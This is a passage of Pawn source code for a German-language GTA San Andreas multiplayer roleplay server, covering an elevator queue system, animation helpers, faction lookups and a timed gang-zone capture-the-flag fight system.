	    Obj_FloorDoors[i][0] 	= CreateObject(18757, X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(i), 0.000000, 0.000000, 270.000000);
		Obj_FloorDoors[i][1] 	= CreateObject(18756, X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(i), 0.000000, 0.000000, 270.000000);

		format(string, sizeof(string), "%s\n Drücke 'F' um den Fahrstuhl zu rufen", FloorNames[i]);

		if(i == 0)
		    z = 13.4713;
		else
		    z = 13.4713 + 8.7396 + ((i-1) * 5.45155);

		Label_Floors[i]         = Create3DTextLabel(string, 0xFFFFDD, 1783.9799, -1300.7660, z, 10.5, 0, 1);
		// Label_Elevator, Text3D:Label_Floors[21];
	}

	// Open ground floor doors:
	Floor_OpenDoors(0);
	Elevator_OpenDoors();

	return 1;
}

stock Elevator_Destroy()
{
	// Destroys the elevator.

	DestroyObject(Obj_Elevator);
	DestroyObject(Obj_ElevatorDoors[0]);
	DestroyObject(Obj_ElevatorDoors[1]);
	Delete3DTextLabel(Label_Elevator);

	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
	    DestroyObject(Obj_FloorDoors[i][0]);
		DestroyObject(Obj_FloorDoors[i][1]);
		Delete3DTextLabel(Label_Floors[i]);
	}

	return 1;
}

stock Elevator_OpenDoors()
{
	// Opens the elevator's doors.

	new Float:x, Float:y, Float:z;

	GetObjectPos(Obj_ElevatorDoors[0], x, y, z);
	MoveObject(Obj_ElevatorDoors[0], X_DOOR_L_OPENED, y, z, DOORS_SPEED);
	MoveObject(Obj_ElevatorDoors[1], X_DOOR_R_OPENED, y, z, DOORS_SPEED);

	return 1;
}

stock Elevator_CloseDoors()
{
    // Closes the elevator's doors.

    if(ElevatorState == ELEVATOR_STATE_MOVING)
	    return 0;

    new Float:x, Float:y, Float:z;

	GetObjectPos(Obj_ElevatorDoors[0], x, y, z);
	MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, y, z, DOORS_SPEED);
	MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, y, z, DOORS_SPEED);

	return 1;
}

stock Floor_OpenDoors(floorid)
{
    // Opens the doors at the specified floor.

    MoveObject(Obj_FloorDoors[floorid][0], X_DOOR_L_OPENED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(Obj_FloorDoors[floorid][1], X_DOOR_R_OPENED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);

	return 1;
}

stock Floor_CloseDoors(floorid)
{
    // Closes the doors at the specified floor.

    MoveObject(Obj_FloorDoors[floorid][0], X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(Obj_FloorDoors[floorid][1], X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);

	return 1;
}

stock Elevator_MoveToFloor(floorid)
{
	// Moves the elevator to specified floor (doors are meant to be already closed).

	ElevatorState = ELEVATOR_STATE_MOVING;
	ElevatorFloor = floorid;

	// Move the elevator slowly, to give time to clients to sync the object surfing. Then, boost it up:
	MoveObject(Obj_Elevator, 1786.678100, -1303.459472, GetElevatorZCoordForFloor(floorid), 0.5);
    MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), 0.5);
    MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), 0.5);
    Delete3DTextLabel(Label_Elevator);

	ElevatorBoostTimer = SetTimerEx("Elevator_Boost", 2000, 0, "i", floorid);

	return 1;
}

Function Elevator_Boost(floorid)
{
	// Increases the elevator's speed until it reaches 'floorid'

	MoveObject(Obj_Elevator, 1786.678100, -1303.459472, GetElevatorZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);

	return 1;
}

Function Elevator_TurnToIdle()
{
	ElevatorState = ELEVATOR_STATE_IDLE;
	ReadNextFloorInQueue();

	return 1;
}

stock RemoveFirstQueueFloor()
{
	// Removes the data in ElevatorQueue[0], and reorders the queue accordingly.

	for(new i; i < sizeof(ElevatorQueue) - 1; i ++)
	    ElevatorQueue[i] = ElevatorQueue[i + 1];

	ElevatorQueue[sizeof(ElevatorQueue) - 1] = INVALID_FLOOR;

	return 1;
}

stock AddFloorToQueue(floorid)
{
 	// Adds 'floorid' at the end of the queue.

	// Scan for the first empty space:
	new slot = -1;
	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    if(ElevatorQueue[i] == INVALID_FLOOR)
	    {
	        slot = i;
	        break;
	    }
	}

	if(slot != -1)
	{
	    ElevatorQueue[slot] = floorid;

     	// If needed, move the elevator.
	    if(ElevatorState == ELEVATOR_STATE_IDLE)
	        ReadNextFloorInQueue();

	    return 1;
	}

	return 0;
}

stock ResetElevatorQueue()
{
	// Resets the queue.

	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    ElevatorQueue[i] 	= INVALID_FLOOR;
	    FloorRequestedBy[i] = INVALID_PLAYER_ID;
	}

	return 1;
}

stock IsFloorInQueue(floorid)
{
	// Checks if the specified floor is currently part of the queue.

	for(new i; i < sizeof(ElevatorQueue); i ++)
	    if(ElevatorQueue[i] == floorid)
	        return 1;

	return 0;
}

stock ReadNextFloorInQueue()
{
	// Reads the next floor in the queue, closes doors, and goes to it.

	if(ElevatorState != ELEVATOR_STATE_IDLE || ElevatorQueue[0] == INVALID_FLOOR)
	    return 0;

	Elevator_CloseDoors();
	Floor_CloseDoors(ElevatorFloor);

	return 1;
}

stock DidPlayerRequestElevator(playerid)
{
	for(new i; i < sizeof(FloorRequestedBy); i ++)
	    if(FloorRequestedBy[i] == playerid)
	        return 1;

	return 0;
}

stock ShowElevatorDialog(playerid)
{
	new string[512];
	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    if(FloorRequestedBy[i] != INVALID_PLAYER_ID)
	        strcat(string, "{FF0000}");

	    strcat(string, FloorNames[i]);
	    strcat(string, "\n");
	}

	ShowPlayerDialog(playerid, DIALOG_ID, DIALOG_STYLE_LIST, "Fahrstuhl", string, "Auswählen", "Zurück");

	return 1;
}

stock CallElevator(playerid, floorid)
{
	// Calls the elevator (also used with the elevator dialog).

	if(FloorRequestedBy[floorid] != INVALID_PLAYER_ID || IsFloorInQueue(floorid))
	    return 0;

	FloorRequestedBy[floorid] = playerid;
	AddFloorToQueue(floorid);

	return 1;
}

stock Float:GetElevatorZCoordForFloor(floorid)
    return (GROUND_Z_COORD + FloorZOffsets[floorid] + ELEVATOR_OFFSET); // A small offset for the elevator object itself.

stock Float:GetDoorsZCoordForFloor(floorid)
	return (GROUND_Z_COORD + FloorZOffsets[floorid]);


OnePlayAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}

LoopingAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
    gPlayerUsingLoopingAnim[playerid] = 1;
    ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
    TextDrawShowForPlayer(playerid,txtAnimHelper);
}
PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}
stock IsKeyJustDown(key, newkeys, oldkeys)
{
	if((newkeys & key) && !(oldkeys & key)) return 1;
	return 0;
}

Function GetPlayerAdmin(playerid){
	if(IsPlayerAdmin(playerid))
	    return 2002;

	if(PlayerInfo[playerid][pAdmin])
	    return PlayerInfo[playerid][pAdmin];

	return 0;
}

Function GetPlayerLeader(playerid)
{
	if(PlayerInfo[playerid][sMember])
	    return PlayerInfo[playerid][sMember];
	return 0;
}

Function GetPlayerMember(playerid){
	if(PlayerInfo[playerid][sMember])
	    return PlayerInfo[playerid][sMember];
	return 0;
}
public FightUpdate_1(){
	for(new fs;fs<sizeof(FightSystem);fs++){
	    if(FightSystem[fs][fsFightTime] && FightSystem[fs][fsAttackFaction] != -255){
	        new fsText[128];
	        if(FightSystem[fs][fsCTF][0] != -255){
	            if(IsPlayerConnected(FightSystem[fs][fsCTF][0])){
	                if(IsPlayerInRangeOfPoint(FightSystem[fs][fsCTF][0],5.0,FightSystem[fs][fsCTFx],FightSystem[fs][fsCTFy],FightSystem[fs][fsCTFz])){
	                    FightSystem[fs][fsCTF][2] = 0;
	                    FightSystem[fs][fsCTF][1]++;
	                    format(fsText,sizeof(fsText),"~n~~n~~n~~n~~n~~n~~n~~w~Bonus in:~n~~r~%d ~w~Sekunden",(60-FightSystem[fs][fsCTF][1]));
						GameTextForPlayer(FightSystem[fs][fsCTF][0],fsText,1250,3);
	                    if(FightSystem[fs][fsCTF][1] >= 60){
						    new fsName[MAX_PLAYER_NAME];
						    GetPlayerName(FightSystem[fs][fsCTF][0],fsName,MAX_PLAYER_NAME);
							FightSystem[fs][fsCTF][1] = 0;
							format(fsText,sizeof(fsText),">>> Fight <<< | %s hat die Flagge erobert!",fsName);
							for(new i;i<MAX_PLAYERS;i++){
							    if(IsPlayerConnected(i)){
       								if(GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction]){
                                    	PlayerPlaySound(i,1058,0.0,0.0,0.0);
										SendClientMessage(i,FS_COL_YELLOW,fsText);
									}
								}
							}
							if(GetPlayerFaction(FightSystem[fs][fsCTF][0]) == FightSystem[fs][fsOwnerFaction])
							    FightSystem[fs][fsKillsOfOwner]++;
							if(GetPlayerFaction(FightSystem[fs][fsCTF][0]) == FightSystem[fs][fsAttackFaction])
								FightSystem[fs][fsKillsOfAttack]++;
                    		if(FightSystem[fs][fsKillsOfOwner] > FightSystem[fs][fsKillsOfAttack]){
                    	    	format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
				        		TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
				        		format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[fs][fsKillsOfOwner]);
                        		TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
								format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
								TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
				        		format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[fs][fsKillsOfAttack]);
								TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
                    		}
                    		else if(FightSystem[fs][fsKillsOfAttack] > FightSystem[fs][fsKillsOfOwner]){
                        		format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
				        		TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
				        		format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[fs][fsKillsOfAttack]);
                        		TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
								format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
								TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
				        		format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[fs][fsKillsOfOwner]);
								TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
                    		}else{
                    		    format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
				        		TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
				        		format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[fs][fsKillsOfOwner]);
                        		TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
								format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
								TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
				        		format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[fs][fsKillsOfAttack]);
								TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
                    		}FightSystem[fs][fsCTF][0] = -255;
						}
	                }else{
	                    format(fsText,sizeof(fsText),"~n~~n~~n~~n~~n~~n~~n~~r~Erobere die Flagge!~n~~b~%d Sekunden",(10-FightSystem[fs][fsCTF][2]));
	                    GameTextForPlayer(FightSystem[fs][fsCTF][0],fsText,1250,3);
	                    FightSystem[fs][fsCTF][2]++;
	                    if(FightSystem[fs][fsCTF][2] >= 10){
						    new fsName[MAX_PLAYER_NAME];
						    GetPlayerName(FightSystem[fs][fsCTF][0],fsName,MAX_PLAYER_NAME);
	                        format(fsText,sizeof(fsText),">>> Fight <<< | %s hat es nicht geschafft die Flagge zu erobern!",fsName);
	                        for(new i;i<MAX_PLAYERS;i++){
	                            if(IsPlayerConnected(i)){
	                        		if(GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction]){
								    	PlayerPlaySound(i,1058,0.0,0.0,0.0);
								    	SendClientMessage(i,FS_COL_YELLOW,fsText);
	                            	}
								}
	                        }
	                        FightSystem[fs][fsCTF][0] = -255;
	                		FightSystem[fs][fsCTF][1] = 0;
	                		FightSystem[fs][fsCTF][2] = 0;
	                    }
	                }
	            }else{
	                FightSystem[fs][fsCTF][0] = -255;
	                FightSystem[fs][fsCTF][1] = 0;
	                FightSystem[fs][fsCTF][2] = 0;
	            }
	        }
	    }
	}return 1;
}
public FightUpdate_2(){
	for(new fs;fs<sizeof(FightSystem);fs++){
	    if(FightSystem[fs][fsFightTime]){
	        FightSystem[fs][fsFightTime]--;
	        new fsText[64];
	        format(fsText,sizeof(fsText),"Verbl. Zeit: %d Minuten",FightSystem[fs][fsFightTime]);
			TextDrawSetString(FightSystem[fs][fsTime],fsText);
			if(!FightSystem[fs][fsFightTime]){
			    FightSystem[fs][fsLastFight] = 0;
			    new fsTextToOwner[255];
			    new fsTextToAttack[255];
			    new fsType;
				if(FightSystem[fs][fsKillsOfOwner] > FightSystem[fs][fsKillsOfAttack]){
				    fsType = 2;
				    format(fsTextToOwner,sizeof(fsTextToOwner),">>> Fight <<< | Ihr habt gewonnen...");
				    format(fsTextToAttack,sizeof(fsTextToAttack),">>> Fight <<< | Ihr habt verloren...");
				}
				else if(FightSystem[fs][fsKillsOfAttack] > FightSystem[fs][fsKillsOfOwner]){
	   				fsType = 3;
				    format(fsTextToOwner,sizeof(fsTextToOwner),">>> Fight <<< | Ihr habt verloren...");
				    format(fsTextToAttack,sizeof(fsTextToAttack),">>> Fight <<< | Ihr habt gewonnen...");
				}else{
				    fsType = 1;
				    format(fsTextToOwner,sizeof(fsTextToOwner),">>> Fight <<< | Unentschieden, ihr behaltet euer gebiet.");
				    format(fsTextToAttack,sizeof(fsTextToAttack),">>> Fight <<< | Unentschieden, ihr müsst euch mehr anstrengen.");
				}
				for(new i;i<MAX_PLAYERS;i++){
					if(IsPlayerConnected(i)){
						GangZoneStopFlashForPlayer(i,FightSystem[fs][fsZoneID]);
				    	if(fsType == 3){
				    		GangZoneHideForPlayer(i,FightSystem[fs][fsZoneID]);
				        	GangZoneShowForPlayer(i,FightSystem[fs][fsZoneID],GetZoneColorOfFaction(FightSystem[fs][fsAttackFaction]));
	        			}
				    	if(GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction]){
				    		PlayerPlaySound(i,1058,0.0,0.0,0.0);
			            	TextDrawHideForPlayer(i,Fight);
							TextDrawHideForPlayer(i,FightUnderline);
							TextDrawHideForPlayer(i,FightSystem[fs][fsWinFaction]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsWinKills]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsLoseFaction]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsLoseKills]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsTime]);
			            	SendClientMessage(i,FS_COL_YELLOW,fsTextToOwner);
			            	if(fsType == 3 && GetPlayerFightzone(i) == fs)
			            		SetPlayerHealth(i,0.0);
						}
						else if(GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction]){
					    	PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
			            	TextDrawHideForPlayer(i,Fight);
							TextDrawHideForPlayer(i,FightUnderline);
							TextDrawHideForPlayer(i,FightSystem[fs][fsWinFaction]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsWinKills]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsLoseFaction]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsLoseKills]);
							TextDrawHideForPlayer(i,FightSystem[fs][fsTime]);
			            	SendClientMessage(i,FS_COL_YELLOW,fsTextToAttack);
			            	if(fsType != 3 && GetPlayerFightzone(i) == fs)
			            		SetPlayerHealth(i,0.0);
						}
	    			}
				}
	    		FightSystem[fs][fsKillsOfAttack] = 0;
				FightSystem[fs][fsKillsOfOwner] = 0;
				if(fsType == 3)
					FightSystem[fs][fsOwnerFaction] = FightSystem[fs][fsAttackFaction];
                FightSystem[fs][fsAttackFaction] = -255;
				FightSystem[fs][fsCTF][0] = -255;
			}
		}
		if(FightSystem[fs][fsLastFight])
 			FightSystem[fs][fsLastFight]--;
  	}return 1;
}
public Fight_Init(){
	Fight = TextDrawCreate(88.000000,244.000000,"Fight:~n~_~n~_~n~_~n~_~n~_");
	TextDrawUseBox(Fight,1);
	TextDrawBoxColor(Fight,0x00000066);
	TextDrawTextSize(Fight,102.000000,124.000000);
	TextDrawAlignment(Fight,2);
	TextDrawBackgroundColor(Fight,0xff000033);
	TextDrawFont(Fight,2);
	TextDrawLetterSize(Fight,0.499999,1.000000);
	TextDrawColor(Fight,0xffffffff);
	TextDrawSetOutline(Fight,1);
	TextDrawSetProportional(Fight,1);
	FightUnderline = TextDrawCreate(91.000000,274.000000,".");
	TextDrawAlignment(FightUnderline,2);
	TextDrawBackgroundColor(FightUnderline,0x000000ff);
	TextDrawFont(FightUnderline,3);
	TextDrawLetterSize(FightUnderline,14.799997,1.000000);
	TextDrawColor(FightUnderline,0xffffffff);
	TextDrawSetProportional(FightUnderline,1);
	TextDrawSetShadow(FightUnderline,1);
	if(!fexist("Fightzones.cfg")){
		new File:fFile=fopen("Fightzones.cfg",io_write);
		for(new fs;fs<sizeof(FightSystem);fs++)
		    fwrite(fFile,"-255 -255 0 0 0\r\n");
	    fclose(fFile);
	}
	new File:fFile=fopen("Fightzones.cfg",io_read),Content[64],fs;
	while(fread(fFile,Content) && fs < sizeof(FightSystem)){
	    FightSystem[fs][fsWinFaction] = TextDrawCreate(26.000000,256.000000," ");
		TextDrawSetProportional(FightSystem[fs][fsWinFaction],1);
		TextDrawAlignment(FightSystem[fs][fsWinFaction],0);
		TextDrawBackgroundColor(FightSystem[fs][fsWinFaction],0x000000ff);
		TextDrawFont(FightSystem[fs][fsWinFaction],2);
		TextDrawLetterSize(FightSystem[fs][fsWinFaction],0.199999,1.000000);
		TextDrawColor(FightSystem[fs][fsWinFaction],0xffffffff);
		TextDrawSetOutline(FightSystem[fs][fsWinFaction],1);
		FightSystem[fs][fsLoseFaction] = TextDrawCreate(26.000000,267.000000," ");
		TextDrawSetProportional(FightSystem[fs][fsLoseFaction],1);
		TextDrawSetOutline(FightSystem[fs][fsLoseFaction],1);
		TextDrawColor(FightSystem[fs][fsLoseFaction],0xffffffff);
		TextDrawFont(FightSystem[fs][fsLoseFaction],2);
		TextDrawLetterSize(FightSystem[fs][fsLoseFaction],0.199999,0.899999);
		TextDrawBackgroundColor(FightSystem[fs][fsLoseFaction],0x000000ff);
		TextDrawAlignment(FightSystem[fs][fsLoseFaction],0);
	 	FightSystem[fs][fsWinKills] = TextDrawCreate(107.000000,256.000000," ");
		TextDrawSetProportional(FightSystem[fs][fsWinKills],1);
		TextDrawSetOutline(FightSystem[fs][fsWinKills],1);
		TextDrawColor(FightSystem[fs][fsWinKills],0xffffffff);
		TextDrawSetShadow(FightSystem[fs][fsWinKills],1);
		TextDrawFont(FightSystem[fs][fsWinKills],2);
		TextDrawLetterSize(FightSystem[fs][fsWinKills],0.199999,1.000000);
		TextDrawBackgroundColor(FightSystem[fs][fsWinKills],0x000000ff);
		TextDrawAlignment(FightSystem[fs][fsWinKills],0);
		FightSystem[fs][fsLoseKills] = TextDrawCreate(107.000000,267.000000," ");
		TextDrawSetProportional(FightSystem[fs][fsLoseKills],1);
		TextDrawSetShadow(FightSystem[fs][fsLoseKills],1);
		TextDrawSetOutline(FightSystem[fs][fsLoseKills],1);
		TextDrawColor(FightSystem[fs][fsLoseKills],0xffffffff);
		TextDrawFont(FightSystem[fs][fsLoseKills],2);
		TextDrawLetterSize(FightSystem[fs][fsLoseKills],0.199999,1.000000);
		TextDrawBackgroundColor(FightSystem[fs][fsLoseKills],0x000000ff);
		TextDrawAlignment(FightSystem[fs][fsLoseKills],0);
		FightSystem[fs][fsTime] = TextDrawCreate(26.000000,286.000000," ");
		TextDrawColor(FightSystem[fs][fsTime],0xffffffff);
		TextDrawAlignment(FightSystem[fs][fsTime],0);
		TextDrawBackgroundColor(FightSystem[fs][fsTime],0x000000ff);
		TextDrawFont(FightSystem[fs][fsTime],2);
		TextDrawLetterSize(FightSystem[fs][fsTime],0.199999,0.899999);
		TextDrawSetProportional(FightSystem[fs][fsTime],1);
		sscanf(Content,"ddddd",FightSystem[fs][fsOwnerFaction],FightSystem[fs][fsAttackFaction],FightSystem[fs][fsKillsOfOwner],FightSystem[fs][fsKillsOfAttack],FightSystem[fs][fsFightTime]);
        FightSystem[fs][fsCTF][0] = -255;
	    FightSystem[fs][fsCTF][1] = 0;
	    FightSystem[fs][fsCTF][2] = 0;
	    FightSystem[fs][fsLastFight] = 0;
	    FightSystem[fs][fsZoneID] = GangZoneCreate(FightSystem[fs][fsMinX],FightSystem[fs][fsMinY],FightSystem[fs][fsMaxX],FightSystem[fs][fsMaxY]);
		FightSystem[fs][fsFlag] = AddStaticPickup(1314,1,FightSystem[fs][fsCTFx],FightSystem[fs][fsCTFy],FightSystem[fs][fsCTFz],-1);
		if(FightSystem[fs][fsFightTime] && FightSystem[fs][fsAttackFaction] != -255){
		    new fsText[64];
		    format(fsText,sizeof(fsText),"Verbl. Zeit: %d Minuten",FightSystem[fs][fsFightTime]);
			TextDrawSetString(FightSystem[fs][fsTime],fsText);
		    if(FightSystem[fs][fsKillsOfOwner] > FightSystem[fs][fsKillsOfAttack]){
 				format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
				TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
				format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[fs][fsKillsOfOwner]);
  				TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
				format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
				TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
  				format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[fs][fsKillsOfAttack]);
				TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
  			}
  			else if(FightSystem[fs][fsKillsOfAttack] > FightSystem[fs][fsKillsOfOwner]){
  				format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
  				TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
  				format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[fs][fsKillsOfAttack]);
  				TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
				format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
				TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
  				format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[fs][fsKillsOfOwner]);
				TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
			}else{
    			format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[fs][fsOwnerFaction]));
  				TextDrawSetString(FightSystem[fs][fsWinFaction],fsText);
  				format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[fs][fsKillsOfOwner]);
  				TextDrawSetString(FightSystem[fs][fsWinKills],fsText);
				format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[fs][fsAttackFaction]));
				TextDrawSetString(FightSystem[fs][fsLoseFaction],fsText);
  				format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[fs][fsKillsOfAttack]);
				TextDrawSetString(FightSystem[fs][fsLoseKills],fsText);
           	}
		}
		for(new i;i<MAX_PLAYERS;i++){
		    if(IsPlayerConnected(i)){
		    	SetPVarInt(i,"Spawned",1);
		    	GangZoneShowForPlayer(i,FightSystem[fs][fsZoneID],GetZoneColorOfFaction(FightSystem[fs][fsOwnerFaction]));
		    	if(FightSystem[fs][fsAttackFaction] && FightSystem[fs][fsFightTime]){
		        	GangZoneFlashForPlayer(i,FightSystem[fs][fsZoneID],GetZoneColorOfFaction(FightSystem[fs][fsAttackFaction]));
					if(GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction] || GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction]){
				    	TextDrawShowForPlayer(i,Fight);
	        	    	TextDrawShowForPlayer(i,FightUnderline);
	        	    	TextDrawShowForPlayer(i,FightSystem[fs][fsWinFaction]);
	        	    	TextDrawShowForPlayer(i,FightSystem[fs][fsLoseFaction]);
	        	    	TextDrawShowForPlayer(i,FightSystem[fs][fsWinKills]);
	        	    	TextDrawShowForPlayer(i,FightSystem[fs][fsLoseKills]);
	        	    	TextDrawShowForPlayer(i,FightSystem[fs][fsTime]);
					}
				}
			}
		}
		fs++;
	}
	fclose(fFile);
	FightTimer[0] = SetTimer("FightUpdate_1",1003,true);
	FightTimer[1] = SetTimer("FightUpdate_2",60017,true);
	return 1;
}
public Fight_Close(){
    KillTimer(FightTimer[0]);
	KillTimer(FightTimer[1]);
	if(fexist("Fightzones.cfg")) fremove("Fightzones.cfg");
	new File:fFile=fopen("Fightzones.cfg",io_append),Content[64];
	for(new fs;fs<sizeof(FightSystem);fs++){
	    if(FightSystem[fs][fsAttackFaction] != -255 && FightSystem[fs][fsFightTime]){
            GangZoneStopFlashForAll(FightSystem[fs][fsZoneID]);
			for(new i;i<MAX_PLAYERS;i++){
			    if(IsPlayerConnected(i)){
					DeletePVar(i,"Spawned");
			    	if(GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction]){
			        	TextDrawHideForPlayer(i,Fight);
			        	TextDrawHideForPlayer(i,FightUnderline);
			        	TextDrawHideForPlayer(i,FightSystem[fs][fsWinFaction]);
			        	TextDrawHideForPlayer(i,FightSystem[fs][fsLoseFaction]);
			        	TextDrawHideForPlayer(i,FightSystem[fs][fsWinKills]);
			        	TextDrawHideForPlayer(i,FightSystem[fs][fsLoseKills]);
			        	TextDrawHideForPlayer(i,FightSystem[fs][fsTime]);
			    	}
				}
			}
		}
		TextDrawDestroy(FightSystem[fs][fsWinFaction]);
		TextDrawDestroy(FightSystem[fs][fsLoseFaction]);
		TextDrawDestroy(FightSystem[fs][fsWinKills]);
		TextDrawDestroy(FightSystem[fs][fsLoseKills]);
		TextDrawDestroy(FightSystem[fs][fsTime]);
		GangZoneHideForAll(FightSystem[fs][fsZoneID]);
        GangZoneDestroy(FightSystem[fs][fsZoneID]);
        DestroyPickup(FightSystem[fs][fsFlag]);
        format(Content,sizeof(Content),"%d %d %d %d %d\r\n",FightSystem[fs][fsOwnerFaction],FightSystem[fs][fsAttackFaction],FightSystem[fs][fsKillsOfOwner],FightSystem[fs][fsKillsOfAttack],FightSystem[fs][fsFightTime]);
		fwrite(fFile,Content);
	}
	fclose(fFile);
	TextDrawDestroy(Fight);
	TextDrawDestroy(FightUnderline);
	return 1;
}
stock GetPlayerFightzone(playerid){
	new Float:GangZone[3];
	GetPlayerPos(playerid,GangZone[0],GangZone[1],GangZone[2]);
	for(new fs;fs<sizeof(FightSystem);fs++){
    	if((GangZone[0] >= FightSystem[fs][fsMinX] && GangZone[0] <= FightSystem[fs][fsMaxX]) && (GangZone[1] >= FightSystem[fs][fsMinY] && GangZone[1] <= FightSystem[fs][fsMaxY]) && GangZone[2] <= 500)
			return fs;
	}return -255;
}
stock IsAFightFaction(Faction){
	if((Faction == 5 || Faction == 6) || Faction == 12|| Faction == 13 || Faction == 14 || Faction == 16 || Faction == 17 || Faction == 18 || Faction == 19 || Faction == 23)
	    return 1;
	return 0;
}
stock GetZoneColorOfFaction(Faction){
	if(Faction == 5) return 0x00000095; // L.C.N
	else if(Faction == 6) return 0x9D9D9D95; // Yakuza
	else if(Faction == 13) return 0x00FF007D; // G.S.F
	else if(Faction == 14) return 0x80008095; // Ballas
	else if(Faction == 19) return 0xFF000095; // Red Soldiers
	else if(Faction == 16) return 0xFFFF0095; // Vagos
	else if(Faction == 17) return 0x0080FF95; // Atzecas
	else if(Faction == 12) return 0x0000E196; // Triaden
	else if(Faction == 18) return 0x1E90FF00; //Rifa
	else if(Faction == 23) return 0x370000FF; //Brigada
	else return 0xFFFFFF77; // NoN-Gang
}














stock GetFactionNameOfFaction(Faction){
	new FactionName[64];
	if(Faction == 5) format(FactionName,sizeof(FactionName),"L.C.N");
	else if(Faction == 6) format(FactionName,sizeof(FactionName),"Yakuza");
	else if(Faction == 12) format(FactionName,sizeof(FactionName),"Triaden");
	else if(Faction == 13) format(FactionName,sizeof(FactionName),"G.S.F");
